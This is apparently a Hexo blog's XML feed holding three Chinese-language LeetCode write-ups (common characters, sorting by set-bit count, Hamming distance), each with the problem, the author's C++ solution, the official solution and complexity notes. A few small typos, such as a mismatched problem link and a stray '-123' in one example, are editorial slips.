  <entry>
    <title>查找常用字符</title>
    <url>/2020/11/13/%E6%9F%A5%E6%89%BE%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/flipping-an-image/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定仅有小写字母组成的字符串数组 <code>A</code>，返回列表中的每个字符串中都显示的全部字符（<strong>包括重复字符</strong>）组成的列表。例如，如果一个字符在每个字符串中出现 3 次，但不是 4 次，则需要在最终答案中包含该字符 3 次。</p>
<p>你可以按任意顺序返回答案。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;bella&quot;,&quot;label&quot;,&quot;roller&quot;]</span><br><span class="line">输出：[&quot;e&quot;,&quot;l&quot;,&quot;l&quot;]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;cool&quot;,&quot;lock&quot;,&quot;cook&quot;]</span><br><span class="line">输出：[&quot;c&quot;,&quot;o&quot;]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>1 &lt;= A.length &lt;= 100</code></li>
<li><code>1 &lt;= A[i].length &lt;= 100</code></li>
<li><code>A[i][j]</code> 是小写字母</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>就是查找多个字符串中的交集（都有的字符），以一个字符串为主进行遍历，然后依次判断每个字符是否在其它字符串中存在，有则添加到结果中并在其它字符串中删除该字符（防止一个字符匹配多次），否则终止进行下一个字符判断。</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败96.77%，内存消耗9M，击败75.28%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">commonChars</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; result;</span><br><span class="line">        <span class="comment">//遍历数组A中的第一个元素中的字符（A.length()&gt;=1），其实遍历A中长度最小的元素比较好</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> i:A[<span class="number">0</span>])&#123;</span><br><span class="line">            <span class="comment">//在其它元素中依次查找A[0]中的字符是否存在</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;A.size();++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(A[j].find(i)!=<span class="built_in">string</span>::npos)&#123;</span><br><span class="line">                    <span class="comment">//删除找到的字符</span></span><br><span class="line">                    A[j].erase(A[j].find(i),<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span>(j==A.size()<span class="number">-1</span>)&#123;</span><br><span class="line">                        <span class="comment">//该字符在所有元素中都存在</span></span><br><span class="line">                        <span class="comment">//把字符i转成字符串</span></span><br><span class="line">                        result.push_back(<span class="built_in">string</span>(<span class="number">1</span>,i));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//若某个元素中没有这个字符则跳出循环，即该字符不满足要求</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/find-common-characters/solution/cha-zhao-chang-yong-zi-fu-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：计数</strong></p>
<p><strong>思路与算法</strong></p>
<p>根据题目的要求，如果字符 cc 在所有字符串中均出现了 $k$ 次及以上，那么最终答案中需要包含 $k$ 个 $c$。因此，我们可以使用 $\textit{minfreq}[c]$ 存储字符 $c$ 在所有字符串中出现次数的最小值。</p>
<p>我们可以依次遍历每一个字符串。当我们遍历到字符串 $s$ 时，我们使用 $\textit{freq}[c]$ 统计 ss 中每一个字符 $c$ 出现的次数。在统计完成之后，我们再将每一个 $\textit{minfreq}[c]$ 更新为其本身与 $\textit{freq}[c]$ 的较小值。这样一来，当我们遍历完所有字符串后，$\textit{minfreq}[c]$ 就存储了字符 $c$ 在所有字符串中出现次数的最小值。</p>
<p>由于题目保证了所有的字符均为小写字母，因此我们可以用长度为 $26$ 的数组分别表示 $\textit{minfreq}$ 以及 $\textit{freq}$。</p>
<p>在构造最终的答案时，我们遍历所有的小写字母 $c$，并将 $\textit{minfreq}[c]$个 $c$ 添加进答案数组即可。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败76.58%，内存消耗9.1M，击败51.59%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">commonChars</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">minfreq</span><span class="params">(<span class="number">26</span>, INT_MAX)</span></span>;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">freq</span><span class="params">(<span class="number">26</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="built_in">string</span>&amp; word: A) &#123;</span><br><span class="line">            fill(freq.begin(), freq.end(), <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">char</span> ch: word) &#123;</span><br><span class="line">                ++freq[ch - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) &#123;</span><br><span class="line">                minfreq[i] = min(minfreq[i], freq[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; minfreq[i]; ++j) &#123;</span><br><span class="line">                ans.emplace_back(<span class="number">1</span>, i + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>时间复杂度：$O(n(m+|\Sigma|))$，其中 $n$ 是数组 $A$的长度（即字符串的数目），$m$是字符串的平均长度，$\Sigma$ 为字符集，在本题中字符集为所有小写字母，$|\Sigma|=26$。</p>
<p>遍历所有字符串并计算 $\textit{freq}$的时间复杂度为 $O(nm)$；<br>使用 $\textit{freq}$ 更新 $\textit{minfreq}$ 的时间复杂度为 $O(n|\Sigma|)$；<br>由于最终答案包含的字符个数不会超过最短的字符串长度，因此构造最终答案的时间复杂度为 $O(m+|\Sigma|)$。这一项在渐进意义上小于前二者，可以忽略。<br>空间复杂度：$O(|\Sigma|)$，这里只计算存储答案之外的空间。我们使用了数组 $\textit{freq}$freq 和 $\textit{minfreq}$，它们的长度均为 $|\Sigma|$。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解使用的又是计数法，遇到好多题都有计数法，我倒是没用过计数法🤣，还是比较喜欢用最直观的解法，效率也不错。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>根据数字二进制下1的数目排序</title>
    <url>/2020/11/06/%E6%A0%B9%E6%8D%AE%E6%95%B0%E5%AD%97%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%8B1%E7%9A%84%E6%95%B0%E7%9B%AE%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/sort-integers-by-the-number-of-1-bits/">题目地址</a></strong></p>
<p><strong>题目名称：</strong>根据数字二进制下1的数目排序</p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 <code>arr</code> 。请你将数组中的元素按照其二进制表示中数字 <strong>1</strong> 的数目升序排序。</p>
<p>如果存在多个数字二进制中 <code>1</code> 的数目相同，则必须将它们按照数值大小升序排列。</p>
<p>请你返回排序后的数组。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [0,1,2,3,4,5,6,7,8]</span><br><span class="line">输出：[0,1,2,4,8,3,5,6,7]</span><br><span class="line">解释：[0] 是唯一一个有 0 个 1 的数。</span><br><span class="line">[1,2,4,8] 都有 1 个 1 。</span><br><span class="line">[3,5,6] 有 2 个 1 。</span><br><span class="line">[7] 有 3 个 1 。</span><br><span class="line">按照 1 的个数排序得到的结果数组为 [0,1,2,4,8,3,5,6,7]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：-123输入：arr &#x3D; [1024,512,256,128,64,32,16,8,4,2,1]</span><br><span class="line">输出：[1,2,4,8,16,32,64,128,256,512,1024]</span><br><span class="line">解释：数组中所有整数二进制下都只有 1 个 1 ，所以你需要按照数值大小将它们排序。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [10000,10000]</span><br><span class="line">输出：[10000,10000]</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [2,3,5,7,11,13,17,19]</span><br><span class="line">输出：[2,3,5,17,7,11,13,19]</span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [10,100,1000,10000]</span><br><span class="line">输出：[10,100,10000,1000]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= arr.length &lt;= 500</code></li>
<li><code>0 &lt;= arr[i] &lt;= 10^4</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>最直观的解法，遍历数组arr，对每一个元素计算二进制表示中1的个数，用一个数组存储相应的个数，然后冒泡排序，最会返回arr</p>
<p><strong>c++代码：</strong>（执行104ms，击败5.42%，内存10.2M，击败30.68%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortByBits</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; num;</span><br><span class="line">        <span class="keyword">int</span> bit_num;</span><br><span class="line">        <span class="keyword">int</span> i,j,tmp;</span><br><span class="line">        <span class="comment">//得到arr数组中每个元素二进制中1的个数</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;arr.size();++i)&#123;</span><br><span class="line">            bit_num=<span class="number">0</span>;</span><br><span class="line">            <span class="comment">//计算二进制中1的个数</span></span><br><span class="line">            tmp=arr[i];</span><br><span class="line">            <span class="keyword">while</span>(tmp)&#123;</span><br><span class="line">                <span class="keyword">if</span>(tmp &amp; <span class="number">1</span>)&#123;</span><br><span class="line">                    ++bit_num;</span><br><span class="line">                &#125;</span><br><span class="line">                tmp&gt;&gt;=<span class="number">1</span>;<span class="comment">//右移1位</span></span><br><span class="line">            &#125;</span><br><span class="line">            num.push_back(bit_num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//对num容器中元素冒泡排序,还可以调用sort方法排序？</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;num.size();++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;num.size()-i<span class="number">-1</span>;++j)&#123;</span><br><span class="line">                <span class="comment">//二进制中1的数目前者比后者大或者数目相同但前者数值大，交换位置</span></span><br><span class="line">                <span class="keyword">if</span>(num[j]&gt;num[j+<span class="number">1</span>] || (num[j]==num[j+<span class="number">1</span>] &amp;&amp; arr[j]&gt;arr[j+<span class="number">1</span>]))&#123;</span><br><span class="line">                    tmp=num[j];</span><br><span class="line">                    num[j]=num[j+<span class="number">1</span>];</span><br><span class="line">                    num[j+<span class="number">1</span>]=tmp;</span><br><span class="line">					<span class="comment">//arr数组排序</span></span><br><span class="line">                    tmp=arr[j];</span><br><span class="line">                    arr[j]=arr[j+<span class="number">1</span>];</span><br><span class="line">                    arr[j+<span class="number">1</span>]=tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a>官方题解：</h6><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>题目本身很简单，只要调用系统自带的排序函数，然后自己改写一下排序规则即可，所以这里主要讲讲如何计算数字二进制下 1 的个数 。</p>
<p><strong>方法一：暴力</strong>（执行20ms，击败87%，内存14M，击败5.04%）</p>
<p>对每个十进制的数转二进制的时候统计一下 1 的个数即可。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x) &#123;</span><br><span class="line">            res += (x % <span class="number">2</span>);</span><br><span class="line">            x /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortByBits</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">bit</span><span class="params">(<span class="number">10001</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> x: arr) &#123;</span><br><span class="line">            bit[x] = get(x);</span><br><span class="line">        &#125;</span><br><span class="line">        sort(arr.begin(),arr.end(),[&amp;](<span class="keyword">int</span> x,<span class="keyword">int</span> y)&#123;</span><br><span class="line">            <span class="keyword">if</span> (bit[x] &lt; bit[y]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (bit[x] &gt; bit[y]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> x &lt; y;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><strong>时间复杂度：</strong>$O(nlogn)$，其中 $n$ 为整数数组 <code>arr</code> 的长度。</li>
<li><strong>空间复杂度：</strong>$O(n)$，其中 $n$ 为整数数组 <code>arr</code> 的长度。</li>
</ul>
<p><strong>方法二：递推预处理</strong>（执行16M，击败90.64%，内存14M，击败5.14%）<br>我们定义 $bit[i]$ 为数字 $i$ 二进制表示下数字 1 的个数，则可以列出递推式：</p>
<p>​                                                        <script type="math/tex">bit[i] = bit[i>>1] + (i \& 1)</script></p>
<p>所以我们线性预处理 $bit$ 数组然后去排序即可。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortByBits</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">bit</span><span class="params">(<span class="number">10001</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= <span class="number">10000</span>; ++i) &#123;</span><br><span class="line">            bit[i] = bit[i&gt;&gt;<span class="number">1</span>] + (i &amp; <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sort(arr.begin(),arr.end(),[&amp;](<span class="keyword">int</span> x,<span class="keyword">int</span> y)&#123;</span><br><span class="line">            <span class="keyword">if</span> (bit[x] &lt; bit[y]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (bit[x] &gt; bit[y]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> x &lt; y;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><strong>时间复杂度：</strong>$O(nlogn)$，其中 $n$ 为整数数组 <code>arr</code> 的长度。</li>
<li><strong>空间复杂度：</strong>$O(n)$，其中 $n$ 为整数数组 arr 的长度。</li>
</ul>
<center>🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓知 识 点🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓</center>

<h6 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h6><ul>
<li>整数二进制表示中1的个数计算</li>
<li>调用系统排序函数，修改排序规则</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解是采用了空间换时间的做法，虽然执行用时很少，但是内存消耗太高了。在成员函数中重写sort函数排序规则这是我没想到的，学到了🤩</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>汉明距离</title>
    <url>/2020/11/10/%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/hamming-distance/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>两个整数之间的<a href="https://baike.baidu.com/item/汉明距离">汉明距离</a>指的是这两个数字对应二进制位不同的位置的数目。</p>
<p>给出两个整数 <code>x</code> 和 <code>y</code>，计算它们之间的汉明距离。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: x &#x3D; 1, y &#x3D; 4</span><br><span class="line"></span><br><span class="line">输出: 2</span><br><span class="line"></span><br><span class="line">解释:</span><br><span class="line">1   (0 0 0 1)</span><br><span class="line">4   (0 1 0 0)</span><br><span class="line">       ↑   ↑</span><br><span class="line"></span><br><span class="line">上面的箭头指出了对应二进制位不同的位置。</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul>
<li>0 ≤ <code>x</code>, <code>y</code> &lt; $2^{31}$​.</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>其实就是两个整数异或运算，得到的结果二进制位相加就是汉明距离。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败26.92%，内存消耗6.3M，击败5.02%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">hammingDistance</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//也就是求两个数字异或结果的二进制各位相加</span></span><br><span class="line">        <span class="keyword">int</span> tmp=x^y;</span><br><span class="line">        <span class="keyword">while</span>(tmp)&#123;</span><br><span class="line">            result+=tmp%<span class="number">2</span>;</span><br><span class="line">            tmp/=<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/hamming-distance/solution/yi-ming-ju-chi-by-leetcode/">官方题解</a>:</h6><p><strong>思路</strong><br>汉明距离广泛应用于多个领域。在编码理论中用于错误检测，在信息论中量化字符串之间的差异。</p>
<p>两个整数之间的汉明距离是对应位置上数字不同的位数。</p>
<p>根据以上定义，提出一种 <a href="https://baike.baidu.com/item/%E5%BC%82%E6%88%96">XOR</a> 的位运算，当且仅当输入位不同时输出为 1。</p>
<p><img src="/2020/11/10/%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB/461_XOR.png" alt="img"></p>
<p>计算 <code>x</code> 和 <code>y</code> 之间的汉明距离，可以先计算 <code>x XOR y</code>，然后统计结果中等于 1 的位数。</p>
<p>现在，原始问题转换为位计数问题。位计数有多种思路，将在下面的方法中介绍。</p>
<p><strong>方法一：内置位计数功能</strong></p>
<p><strong>思路</strong></p>
<p>大多数编程语言中，都存在各种内置计算等于 1 的位数函数。如果这是一个项目中的问题，应该直接使用内置函数，而不是重复造轮子。</p>
<p>但这是一个力扣问题，有人会认为使用内置函数就好像使用 使用 LinkedList 实现 LinkedList。对此，我们完全赞同。因此后面会有手工实现的位计数算法。</p>
<p><strong>python代码：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hammingDistance</span>(<span class="params">self, x: int, y: int</span>) -&gt; int:</span></span><br><span class="line">        <span class="keyword">return</span> bin(x ^ y).count(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(1)$。</p>
</li>
<li><p>该算法有两个操作。计算 XOR 花费恒定时间。</p>
</li>
<li><p>调用内置的 bitCount 函数。最坏情况下，该函数复杂度为$O(k)$，其中 $k$ 是整数的位数。在 Python 和 Java 中 Integer 是固定长度的。因此该算法复杂度恒定，与输入大小无关。</p>
</li>
<li><p>空间复杂度：$O(1)$，使用恒定大小的空间保存 XOR 的结果。</p>
<ul>
<li>假设内置函数也使用恒定空间。</li>
</ul>
</li>
</ul>
<p><strong>方法二：移位</strong></p>
<p><strong>思路</strong></p>
<p>为了计算等于 <code>1</code> 的位数，可以将每个位移动到最左侧或最右侧，然后检查该位是否为 <code>1</code>。</p>
<p>更准确的说，应该进行逻辑移位，移入零替换丢弃的位。</p>
<p><img src="/2020/11/10/%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB/461_shift.png" alt="img"></p>
<p>这里采用右移位，每个位置都会被移动到最右边。移位后检查最右位的位是否为 <code>1</code> 即可。检查最右位是否为 <code>1</code>，可以使用取模运算<code>（i % 2）</code>或者 AND 操作<code>（i &amp; 1）</code>，这两个操作都会屏蔽最右位以外的其他位。</p>
<p><strong>python代码：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hammingDistance</span>(<span class="params">self, x, y</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type x: int</span></span><br><span class="line"><span class="string">        :type y: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        xor = x ^ y</span><br><span class="line">        distance = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> xor:</span><br><span class="line">            <span class="comment"># mask out the rest bits</span></span><br><span class="line">            <span class="keyword">if</span> xor &amp; <span class="number">1</span>:</span><br><span class="line">                distance += <span class="number">1</span></span><br><span class="line">            xor = xor &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> distance</span><br></pre></td></tr></table></figure>
